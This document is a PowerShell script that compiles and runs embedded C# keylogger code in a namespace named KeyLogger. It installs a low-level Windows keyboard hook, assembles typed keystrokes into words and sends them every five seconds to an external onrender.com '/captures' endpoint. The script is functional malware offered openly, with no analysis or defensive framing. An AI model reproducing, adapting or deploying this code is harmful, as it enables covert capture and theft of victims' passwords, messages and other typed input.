Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Text;
using System.Net;
using System.Threading;

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    // To hold the current word being typed
    private static string currentWord = "";

    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;

    // Timer to periodically send captured words to the server (using System.Threading.Timer)
    private static System.Threading.Timer sendTimer;  // Fully qualified Timer
    private static object lockObject = new object();

    public static void Main() {
      hookId = SetHook(hookProc);

      // Setup a timer that sends captured words every 5 seconds
      sendTimer = new System.Threading.Timer(SendWordsToServer, null, 0, 5000);  // Fully qualified Timer

      Application.Run();
      UnhookWindowsHookEx(hookId);
    }

    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static void SendWordToServer(string word) {
      try {
        // Prepare the request body with the 'words' key
        string jsonBody = "{ \"words\": \"" + word + "\" }";

        // Use WebRequest to send the POST request to the server
        string url = "https://me-sz5y.onrender.com/captures";
        var webRequest = System.Net.WebRequest.Create(url);
        webRequest.Method = "POST";
        byte[] byteArray = Encoding.UTF8.GetBytes(jsonBody);
        webRequest.ContentType = "application/json";
        webRequest.ContentLength = byteArray.Length;

        using (Stream dataStream = webRequest.GetRequestStream()) {
          dataStream.Write(byteArray, 0, byteArray.Length);
        }

        var response = webRequest.GetResponse();
        response.Close();
      }
      catch (Exception ex) {
        Console.WriteLine("Error sending to server: " + ex.Message);
      }
    }

    private static void SendWordsToServer(object state) {
      lock (lockObject) {
        if (!string.IsNullOrEmpty(currentWord)) {
          // Send the current word to the server and reset the word buffer
          SendWordToServer(currentWord);
          currentWord = "";  // Reset for the next word
        }
      }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        int vkCode = Marshal.ReadInt32(lParam);
        Keys key = (Keys)vkCode;

        // Skip modifier keys like Shift, Ctrl, Alt, etc.
        if (key == Keys.Shift || key == Keys.ControlKey || key == Keys.Menu || key == Keys.LShiftKey || key == Keys.RShiftKey) {
          return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        string keyText = key.ToString().ToLower();

        // Handle numbers and special characters correctly
        if (key >= Keys.D0 && key <= Keys.D9) {
          keyText = key.ToString().Replace("D", "");  // Remove the 'D' from D0, D1, etc.
        }
        else if (key >= Keys.NumPad0 && key <= Keys.NumPad9) {
          keyText = key.ToString().Replace("NumPad", ""); // Handle numpad keys as well
        }
        // Handle specific key codes directly
        else if (vkCode == 0xBB) { // '+' key (OemPlus virtual key code)
          keyText = "+";
        }
        else if (vkCode == 0xBD) { // '-' key (OemMinus virtual key code)
          keyText = "-";
        }
        else if (vkCode == 0xBE) { // '.' key (OemPeriod virtual key code)
          keyText = ".";
        }
        else if (vkCode == 0xC0) { // '`' key (OemTilde virtual key code)
          keyText = "`";
        }

        // Check for space, backspace, or other valid keys
        if (key == Keys.Space) {
          if (!string.IsNullOrEmpty(currentWord)) {
            lock (lockObject) {
              currentWord += " ";  // Add space when spacebar is pressed
            }
          }
        }
        else if (key == Keys.Back) {
          // If Backspace is pressed, remove the last character from the current word
          if (currentWord.Length > 0) {
            lock (lockObject) {
              currentWord = currentWord.Substring(0, currentWord.Length - 1);
            }
          }
        }
        else {
          // Add the valid character to the current word
          lock (lockObject) {
            currentWord += keyText;
          }
        }
      }

      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
  }
}
"@ -ReferencedAssemblies System.Windows.Forms

[KeyLogger.Program]::Main();
